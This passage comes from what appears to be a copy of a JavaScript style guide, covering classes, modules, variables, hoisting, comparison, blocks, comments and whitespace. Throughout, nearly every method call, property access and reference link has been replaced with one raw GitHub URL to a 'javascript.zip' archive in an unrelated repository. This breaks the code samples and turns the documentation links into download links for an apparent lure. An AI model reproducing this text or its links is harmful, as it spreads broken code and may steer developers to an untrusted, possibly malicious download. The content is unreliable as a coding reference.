      constructor(contents = []) {
        https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip = [https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip];
      }
      pop() {
        const value = https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip[0];
        https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(0, 1);
        return value;
      }
    }
    ```

  <a name="constructors--extends"></a><a name="9.2"></a>
  - [9.2](#constructors--extends) Use `extends` for inheritance.

    > Why? It is a built-in way to inherit prototype functionality without breaking `instanceof`.

    ```javascript
    // bad
    const inherits = require('inherits');
    function PeekableQueue(contents) {
      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(this, contents);
    }
    inherits(PeekableQueue, Queue);
    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip = function () {
      return this._queue[0];
    }

    // good
    class PeekableQueue extends Queue {
      peek() {
        return this._queue[0];
      }
    }
    ```

  <a name="constructors--chaining"></a><a name="9.3"></a>
  - [9.3](#constructors--chaining) Methods can return `this` to help with method chaining.

    ```javascript
    // bad
    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip = function () {
      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip = true;
      return true;
    };

    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip = function (height) {
      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip = height;
    };

    const luke = new Jedi();
    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(); // => true
    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(20); // => undefined

    // good
    class Jedi {
      jump() {
        https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip = true;
        return this;
      }

      setHeight(height) {
        https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip = height;
        return this;
      }
    }

    const luke = new Jedi();

    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip()
      .setHeight(20);
    ```


  <a name="constructors--tostring"></a><a name="9.4"></a>
  - [9.4](#constructors--tostring) It's okay to write a custom toString() method, just make sure it works successfully and causes no side effects.

    ```javascript
    class Jedi {
      constructor(options = {}) {
        https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip = https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip || 'no name';
      }

      getName() {
        return https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip;
      }

      toString() {
        return `Jedi - ${https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip()}`;
      }
    }
    ```

  <a name="constructors--no-useless"></a><a name="9.5"></a>
  - [9.5](#constructors--no-useless) Classes have a default constructor if one is not specified. An empty constructor function or one that just delegates to a parent class is unnecessary. eslint: [`no-useless-constructor`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    ```javascript
    // bad
    class Jedi {
      constructor() {}

      getName() {
        return https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip;
      }
    }

    // bad
    class Rey extends Jedi {
      constructor(https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) {
        super(https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip);
      }
    }

    // good
    class Rey extends Jedi {
      constructor(https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) {
        super(https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip);
        https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip = 'Rey';
      }
    }
    ```

  <a name="classes--no-duplicate-members"></a>
  - [9.6](#classes--no-duplicate-members) Avoid duplicate class members. eslint: [`no-dupe-class-members`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    > Why? Duplicate class member declarations will silently prefer the last one - having duplicates is almost certainly a bug.

    ```javascript
    // bad
    class Foo {
      bar() { return 1; }
      bar() { return 2; }
    }

    // good
    class Foo {
      bar() { return 1; }
    }

    // good
    class Foo {
      bar() { return 2; }
    }
    ```


**[⬆ back to top](#table-of-contents)**


## Modules

  <a name="modules--use-them"></a><a name="10.1"></a>
  - [10.1](#modules--use-them) Always use modules (`import`/`export`) over a non-standard module system. You can always transpile to your preferred module system.

    > Why? Modules are the future, let's start using the future now.

    ```javascript
    // bad
    const AirbnbStyleGuide = require('./AirbnbStyleGuide');
    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip = https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip;

    // ok
    import AirbnbStyleGuide from './AirbnbStyleGuide';
    export default https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip;

    // best
    import { es6 } from './AirbnbStyleGuide';
    export default es6;
    ```

  <a name="modules--no-wildcard"></a><a name="10.2"></a>
  - [10.2](#modules--no-wildcard) Do not use wildcard imports.

    > Why? This makes sure you have a single default export.

    ```javascript
    // bad
    import * as AirbnbStyleGuide from './AirbnbStyleGuide';

    // good
    import AirbnbStyleGuide from './AirbnbStyleGuide';
    ```

  <a name="modules--no-export-from-import"></a><a name="10.3"></a>
  - [10.3](#modules--no-export-from-import) And do not export directly from an import.

    > Why? Although the one-liner is concise, having one clear way to import and one clear way to export makes things consistent.

    ```javascript
    // bad
    // filename https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip
    export { es6 as default } from './airbnbStyleGuide';

    // good
    // filename https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip
    import { es6 } from './AirbnbStyleGuide';
    export default es6;
    ```

  <a name="modules--no-duplicate-imports"></a>
  - [10.4](#modules--no-duplicate-imports) Only import from a path in one place.
 eslint: [`no-duplicate-imports`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
    > Why? Having multiple lines that import from the same path can make code harder to maintain.

    ```javascript
    // bad
    import foo from 'foo';
    // … some other imports … //
    import { named1, named2 } from 'foo';

    // good
    import foo, { named1, named2 } from 'foo';

    // good
    import foo, {
      named1,
      named2,
    } from 'foo';
    ```

  <a name="modules--no-mutable-exports"></a>
  - [10.5](#modules--no-mutable-exports) Do not export mutable bindings.
 eslint: [`import/no-mutable-exports`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
    > Why? Mutation should be avoided in general, but in particular when exporting mutable bindings. While this technique may be needed for some special cases, in general, only constant references should be exported.

    ```javascript
    // bad
    let foo = 3;
    export { foo }

    // good
    const foo = 3;
    export { foo }
    ```

  <a name="modules--prefer-default-export"></a>
  - [10.6](#modules--prefer-default-export) In modules with a single export, prefer default export over named export.
 eslint: [`import/prefer-default-export`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    ```javascript
    // bad
    export function foo() {}

    // good
    export default function foo() {}
    ```

  <a name="modules--imports-first"></a>
  - [10.7](#modules--imports-first) Put all `import`s above non-import statements.
 eslint: [`import/imports-first`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
    > Why? Since `import`s are hoisted, keeping them all at the top prevents surprising behavior.

    ```javascript
    // bad
    import foo from 'foo';
    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip();

    import bar from 'bar';

    // good
    import foo from 'foo';
    import bar from 'bar';

    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip();
    ```

**[⬆ back to top](#table-of-contents)**

## Iterators and Generators

  <a name="iterators--nope"></a><a name="11.1"></a>
  - [11.1](#iterators--nope) Don't use iterators. Prefer JavaScript's higher-order functions instead of loops like `for-in` or `for-of`. eslint: [`no-iterator`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) [`no-restricted-syntax`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    > Why? This enforces our immutable rule. Dealing with pure functions that return values is easier to reason about than side effects.

    > Use `map()` / `every()` / `filter()` / `find()` / `findIndex()` / `reduce()` / `some()` / ... to iterate over arrays, and `https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip()` / `https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip()` / `https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip()` to produce arrays so you can iterate over objects.

    ```javascript
    const numbers = [1, 2, 3, 4, 5];

    // bad
    let sum = 0;
    for (let num of numbers) {
      sum += num;
    }

    sum === 15;

    // good
    let sum = 0;
    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(num => sum += num);
    sum === 15;

    // best (use the functional force)
    const sum = https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip((total, num) => total + num, 0);
    sum === 15;
    ```

  <a name="generators--nope"></a><a name="11.2"></a>
  - [11.2](#generators--nope) Don't use generators for now.

    > Why? They don't transpile well to ES5.

  <a name="generators--spacing"></a>
  - [11.3](#generators--spacing) If you must use generators, or if you disregard [our advice](#generators--nope), make sure their function signature is spaced properly. eslint: [`generator-star-spacing`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    > Why? `function` and `*` are part of the same conceptual keyword - `*` is not a modifier for `function`, `function*` is a unique construct, different from `function`.

    ```js
    // bad
    function * foo() {
    }

    const bar = function * () {
    }

    const baz = function *() {
    }

    const quux = function*() {
    }

    function*foo() {
    }

    function *foo() {
    }

    // very bad
    function
    *
    foo() {
    }

    const wat = function
    *
    () {
    }

    // good
    function* foo() {
    }

    const foo = function* () {
    }
    ```

**[⬆ back to top](#table-of-contents)**


## Properties

  <a name="properties--dot"></a><a name="12.1"></a>
  - [12.1](#properties--dot) Use dot notation when accessing properties. eslint: [`dot-notation`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs: [`requireDotNotation`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    ```javascript
    const luke = {
      jedi: true,
      age: 28,
    };

    // bad
    const isJedi = luke['jedi'];

    // good
    const isJedi = https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip;
    ```

  <a name="properties--bracket"></a><a name="12.2"></a>
  - [12.2](#properties--bracket) Use bracket notation `[]` when accessing properties with a variable.

    ```javascript
    const luke = {
      jedi: true,
      age: 28,
    };

    function getProp(prop) {
      return luke[prop];
    }

    const isJedi = getProp('jedi');
    ```

**[⬆ back to top](#table-of-contents)**


## Variables

  <a name="variables--const"></a><a name="13.1"></a>
  - [13.1](#variables--const) Always use `const` to declare variables. Not doing so will result in global variables. We want to avoid polluting the global namespace. Captain Planet warned us of that. eslint: [`no-undef`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) [`prefer-const`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    ```javascript
    // bad
    superPower = new SuperPower();

    // good
    const superPower = new SuperPower();
    ```

  <a name="variables--one-const"></a><a name="13.2"></a>
  - [13.2](#variables--one-const) Use one `const` declaration per variable. eslint: [`one-var`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs: [`disallowMultipleVarDecl`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    > Why? It's easier to add new variable declarations this way, and you never have to worry about swapping out a `;` for a `,` or introducing punctuation-only diffs. You can also step through each declaration with the debugger, instead of jumping through all of them at once.

    ```javascript
    // bad
    const items = getItems(),
        goSportsTeam = true,
        dragonball = 'z';

    // bad
    // (compare to above, and try to spot the mistake)
    const items = getItems(),
        goSportsTeam = true;
        dragonball = 'z';

    // good
    const items = getItems();
    const goSportsTeam = true;
    const dragonball = 'z';
    ```

  <a name="variables--const-let-group"></a><a name="13.3"></a>
  - [13.3](#variables--const-let-group) Group all your `const`s and then group all your `let`s.

    > Why? This is helpful when later on you might need to assign a variable depending on one of the previous assigned variables.

    ```javascript
    // bad
    let i, len, dragonball,
        items = getItems(),
        goSportsTeam = true;

    // bad
    let i;
    const items = getItems();
    let dragonball;
    const goSportsTeam = true;
    let len;

    // good
    const goSportsTeam = true;
    const items = getItems();
    let dragonball;
    let i;
    let length;
    ```

  <a name="variables--define-where-used"></a><a name="13.4"></a>
  - [13.4](#variables--define-where-used) Assign variables where you need them, but place them in a reasonable place.

    > Why? `let` and `const` are block scoped and not function scoped.

    ```javascript
    // bad - unnecessary function call
    function checkName(hasName) {
      const name = getName();

      if (hasName === 'test') {
        return false;
      }

      if (name === 'test') {
        https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('');
        return false;
      }

      return name;
    }

    // good
    function checkName(hasName) {
      if (hasName === 'test') {
        return false;
      }

      const name = getName();

      if (name === 'test') {
        https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('');
        return false;
      }

      return name;
    }
    ```
  <a name="variables--no-chain-assignment"></a><a name="13.5"></a>
  - [13.5](#variables--no-chain-assignment) Don't chain variable assignments.

    > Why? Chaining variable assignments creates implicit global variables.

    ```javascript
    // bad
    (function example() {
      // JavaScript interprets this as
      // let a = ( b = ( c = 1 ) );
      // The let keyword only applies to variable a; variables b and c become
      // global variables.
      let a = b = c = 1;
    }());

    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(a); // undefined
    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(b); // 1
    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(c); // 1

    // good
    (function example() {
      let a = 1;
      let b = a;
      let c = a;
    }());

    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(a); // undefined
    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(b); // undefined
    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(c); // undefined

    // the same applies for `const`
    ```

  <a name="variables--unary-increment-decrement"></a><a name="13.6"></a>
  - [13.6](#variables--unary-increment-decrement) Avoid using unary increments and decrements (++, --). eslint [`no-plusplus`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    > Why? Per the eslint documentation, unary increment and decrement statements are subject to automatic semicolon insertion and can cause silent errors with incrementing or decrementing values within an application. It is also more expressive to mutate your values with statements like `num += 1` instead of `num ++`. Disallowing unary increment and decrement statements also prevents you from pre-incrementing/pre-decrementing values unintentionally which can also cause unexpected behavior in your programs.

    ```javascript
      // bad

      let array = [1, 2, 3];
      let num = 1;
      let increment = num ++;
      let decrement = -- num;

      for(let i = 0; i < https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip; i++){
        let value = array[i];
        ++value;
      }

      // good

      let array = [1, 2, 3];
      let num = 1;
      let increment = num += 1;
      let decrement = num -= 1;

      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip((value) => {
        value += 1;
      });
    ```

**[⬆ back to top](#table-of-contents)**


## Hoisting

  <a name="hoisting--about"></a><a name="14.1"></a>
  - [14.1](#hoisting--about) `var` declarations get hoisted to the top of their scope, their assignment does not. `const` and `let` declarations are blessed with a new concept called [Temporal Dead Zones (TDZ)](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip). It's important to know why [typeof is no longer safe](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip).

    ```javascript
    // we know this wouldn't work (assuming there
    // is no notDefined global variable)
    function example() {
      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(notDefined); // => throws a ReferenceError
    }

    // creating a variable declaration after you
    // reference the variable will work due to
    // variable hoisting. Note: the assignment
    // value of `true` is not hoisted.
    function example() {
      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(declaredButNotAssigned); // => undefined
      var declaredButNotAssigned = true;
    }

    // the interpreter is hoisting the variable
    // declaration to the top of the scope,
    // which means our example could be rewritten as:
    function example() {
      let declaredButNotAssigned;
      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(declaredButNotAssigned); // => undefined
      declaredButNotAssigned = true;
    }

    // using const and let
    function example() {
      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(declaredButNotAssigned); // => throws a ReferenceError
      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(typeof declaredButNotAssigned); // => throws a ReferenceError
      const declaredButNotAssigned = true;
    }
    ```

  <a name="hoisting--anon-expressions"></a><a name="14.2"></a>
  - [14.2](#hoisting--anon-expressions) Anonymous function expressions hoist their variable name, but not the function assignment.

    ```javascript
    function example() {
      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(anonymous); // => undefined

      anonymous(); // => TypeError anonymous is not a function

      var anonymous = function () {
        https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('anonymous function expression');
      };
    }
    ```

  <a name="hoisting--named-expresions"></a><a name="14.3"></a>
  - [14.3](#hoisting--named-expresions) Named function expressions hoist the variable name, not the function name or the function body.

    ```javascript
    function example() {
      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(named); // => undefined

      named(); // => TypeError named is not a function

      superPower(); // => ReferenceError superPower is not defined

      var named = function superPower() {
        https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('Flying');
      };
    }

    // the same is true when the function name
    // is the same as the variable name.
    function example() {
      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(named); // => undefined

      named(); // => TypeError named is not a function

      var named = function named() {
        https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('named');
      }
    }
    ```

  <a name="hoisting--declarations"></a><a name="14.4"></a>
  - [14.4](#hoisting--declarations) Function declarations hoist their name and the function body.

    ```javascript
    function example() {
      superPower(); // => Flying

      function superPower() {
        https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('Flying');
      }
    }
    ```

  - For more information refer to [JavaScript Scoping & Hoisting](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) by [Ben Cherry](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip).

**[⬆ back to top](#table-of-contents)**


## Comparison Operators & Equality

  <a name="comparison--eqeqeq"></a><a name="15.1"></a>
  - [15.1](#comparison--eqeqeq) Use `===` and `!==` over `==` and `!=`. eslint: [`eqeqeq`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

  <a name="comparison--if"></a><a name="15.2"></a>
  - [15.2](#comparison--if) Conditional statements such as the `if` statement evaluate their expression using coercion with the `ToBoolean` abstract method and always follow these simple rules:

    + **Objects** evaluate to **true**
    + **Undefined** evaluates to **false**
    + **Null** evaluates to **false**
    + **Booleans** evaluate to **the value of the boolean**
    + **Numbers** evaluate to **false** if **+0, -0, or NaN**, otherwise **true**
    + **Strings** evaluate to **false** if an empty string `''`, otherwise **true**

    ```javascript
    if ([0] && []) {
      // true
      // an array (even an empty one) is an object, objects will evaluate to true
    }
    ```

  <a name="comparison--shortcuts"></a><a name="15.3"></a>
  - [15.3](#comparison--shortcuts) Use shortcuts.

    ```javascript
    // bad
    if (name !== '') {
      // https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip
    }

    // good
    if (name) {
      // https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip
    }

    // bad
    if (https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip > 0) {
      // https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip
    }

    // good
    if (https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) {
      // https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip
    }
    ```

  <a name="comparison--moreinfo"></a><a name="15.4"></a>
  - [15.4](#comparison--moreinfo) For more information see [Truth Equality and JavaScript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) by Angus Croll.

  <a name="comparison--switch-blocks"></a><a name="15.5"></a>
  - [15.5](#comparison--switch-blocks) Use braces to create blocks in `case` and `default` clauses that contain lexical declarations (e.g. `let`, `const`, `function`, and `class`).

  > Why? Lexical declarations are visible in the entire `switch` block but only get initialized when assigned, which only happens when its `case` is reached. This causes problems when multiple `case` clauses attempt to define the same thing.

  eslint rules: [`no-case-declarations`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip).

    ```javascript
    // bad
    switch (foo) {
      case 1:
        let x = 1;
        break;
      case 2:
        const y = 2;
        break;
      case 3:
        function f() {}
        break;
      default:
        class C {}
    }

    // good
    switch (foo) {
      case 1: {
        let x = 1;
        break;
      }
      case 2: {
        const y = 2;
        break;
      }
      case 3: {
        function f() {}
        break;
      }
      case 4:
        bar();
        break;
      default: {
        class C {}
      }
    }
    ```

  <a name="comparison--nested-ternaries"></a><a name="15.6"></a>
  - [15.6](#comparison--nested-ternaries) Ternaries should not be nested and generally be single line expressions.

    eslint rules: [`no-nested-ternary`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip).

    ```javascript
    // bad
    const foo = maybe1 > maybe2
      ? "bar"
      : value1 > value2 ? "baz" : null;

    // better
    const maybeNull = value1 > value2 ? 'baz' : null;

    const foo = maybe1 > maybe2
      ? 'bar'
      : maybeNull;

    // best
    const maybeNull = value1 > value2 ? 'baz' : null;

    const foo = maybe1 > maybe2 ? 'bar' : maybeNull;
    ```

  <a name="comparison--unneeded-ternary"></a><a name="15.7"></a>
  - [15.7](#comparison--unneeded-ternary) Avoid unneeded ternary statements.

    eslint rules: [`no-unneeded-ternary`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip).

    ```javascript
    // bad
    const foo = a ? a : b;
    const bar = c ? true : false;
    const baz = c ? false : true;

    // good
    const foo = a || b;
    const bar = !!c;
    const baz = !c;
    ```

**[⬆ back to top](#table-of-contents)**


## Blocks

  <a name="blocks--braces"></a><a name="16.1"></a>
  - [16.1](#blocks--braces) Use braces with all multi-line blocks.

    ```javascript
    // bad
    if (test)
      return false;

    // good
    if (test) return false;

    // good
    if (test) {
      return false;
    }

    // bad
    function foo() { return false; }

    // good
    function bar() {
      return false;
    }
    ```

  <a name="blocks--cuddled-elses"></a><a name="16.2"></a>
  - [16.2](#blocks--cuddled-elses) If you're using multi-line blocks with `if` and `else`, put `else` on the same line as your `if` block's closing brace. eslint: [`brace-style`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs:  [`disallowNewlineBeforeBlockStatements`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    ```javascript
    // bad
    if (test) {
      thing1();
      thing2();
    }
    else {
      thing3();
    }

    // good
    if (test) {
      thing1();
      thing2();
    } else {
      thing3();
    }
    ```


**[⬆ back to top](#table-of-contents)**


## Comments

  <a name="comments--multiline"></a><a name="17.1"></a>
  - [17.1](#comments--multiline) Use `/** ... */` for multi-line comments.

    ```javascript
    // bad
    // make() returns a new element
    // based on the passed in tag name
    //
    // @param {String} tag
    // @return {Element} element
    function make(tag) {

      // https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip

      return element;
    }

    // good
    /**
     * make() returns a new element
     * based on the passed-in tag name
     */
    function make(tag) {

      // https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip

      return element;
    }
    ```

  <a name="comments--singleline"></a><a name="17.2"></a>
  - [17.2](#comments--singleline) Use `//` for single line comments. Place single line comments on a newline above the subject of the comment. Put an empty line before the comment unless it's on the first line of a block.

    ```javascript
    // bad
    const active = true;  // is current tab

    // good
    // is current tab
    const active = true;

    // bad
    function getType() {
      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('fetching type...');
      // set the default type to 'no type'
      const type = this._type || 'no type';

      return type;
    }

    // good
    function getType() {
      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('fetching type...');

      // set the default type to 'no type'
      const type = this._type || 'no type';

      return type;
    }

    // also good
    function getType() {
      // set the default type to 'no type'
      const type = this._type || 'no type';

      return type;
    }
    ```

  <a name="comments--actionitems"></a><a name="17.3"></a>
  - [17.3](#comments--actionitems) Prefixing your comments with `FIXME` or `TODO` helps other developers quickly understand if you're pointing out a problem that needs to be revisited, or if you're suggesting a solution to the problem that needs to be implemented. These are different than regular comments because they are actionable. The actions are `FIXME: -- need to figure this out` or `TODO: -- need to implement`.

  <a name="comments--fixme"></a><a name="17.4"></a>
  - [17.4](#comments--fixme) Use `// FIXME:` to annotate problems.

    ```javascript
    class Calculator extends Abacus {
      constructor() {
        super();

        // FIXME: shouldn't use a global here
        total = 0;
      }
    }
    ```

  <a name="comments--todo"></a><a name="17.5"></a>
  - [17.5](#comments--todo) Use `// TODO:` to annotate solutions to problems.

    ```javascript
    class Calculator extends Abacus {
      constructor() {
        super();

        // TODO: total should be configurable by an options param
        https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip = 0;
      }
    }
    ```

**[⬆ back to top](#table-of-contents)**


## Whitespace

  <a name="whitespace--spaces"></a><a name="18.1"></a>
  - [18.1](#whitespace--spaces) Use soft tabs set to 2 spaces. eslint: [`indent`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs: [`validateIndentation`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    ```javascript
    // bad
    function foo() {
    ∙∙∙∙const name;
    }

    // bad
    function bar() {
    ∙const name;
    }

    // good
    function baz() {
    ∙∙const name;
    }
    ```

  <a name="whitespace--before-blocks"></a><a name="18.2"></a>
  - [18.2](#whitespace--before-blocks) Place 1 space before the leading brace. eslint: [`space-before-blocks`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs: [`requireSpaceBeforeBlockStatements`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    ```javascript
    // bad
    function test(){
      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('test');
    }

    // good
    function test() {
      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('test');
    }

    // bad
    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('attr',{
      age: '1 year',
      breed: 'Bernese Mountain Dog',
    });

    // good
    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('attr', {
      age: '1 year',
      breed: 'Bernese Mountain Dog',
    });
    ```

  <a name="whitespace--around-keywords"></a><a name="18.3"></a>
  - [18.3](#whitespace--around-keywords) Place 1 space before the opening parenthesis in control statements (`if`, `while` etc.). Place no space between the argument list and the function name in function calls and declarations. eslint: [`keyword-spacing`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs: [`requireSpaceAfterKeywords`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    ```javascript
    // bad
    if(isJedi) {
      fight ();
    }

    // good
    if (isJedi) {
      fight();
    }

    // bad
    function fight () {
      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip ('Swooosh!');
    }

    // good
    function fight() {
      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('Swooosh!');
    }
    ```

  <a name="whitespace--infix-ops"></a><a name="18.4"></a>
  - [18.4](#whitespace--infix-ops) Set off operators with spaces. eslint: [`space-infix-ops`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs: [`requireSpaceBeforeBinaryOperators`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip), [`requireSpaceAfterBinaryOperators`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    ```javascript
    // bad
    const x=y+5;

    // good
    const x = y + 5;
    ```

  <a name="whitespace--newline-at-end"></a><a name="18.5"></a>
  - [18.5](#whitespace--newline-at-end) End files with a single newline character. eslint: [`eol-last`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    ```javascript
    // bad
    (function (global) {
      // https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip
    })(this);
    ```

    ```javascript
    // bad
    (function (global) {
      // https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip
    })(this);↵
    ↵
    ```

    ```javascript
    // good
    (function (global) {
      // https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip
    })(this);↵
    ```

  <a name="whitespace--chains"></a><a name="18.6"></a>
  - [18.6](#whitespace--chains) Use indentation when making long method chains (more than 2 method chains). Use a leading dot, which
    emphasizes that the line is a method call, not a new statement. eslint: [`newline-per-chained-call`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) [`no-whitespace-before-property`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    ```javascript
    // bad
    $('#items').find('.selected').highlight().end().find('.open').updateCount();

    // bad
    $('#items').
      find('.selected').
        highlight().
        end().
      find('.open').
        updateCount();

    // good
    $('#items')
      .find('.selected')
        .highlight()
        .end()
      .find('.open')
        .updateCount();

    // bad
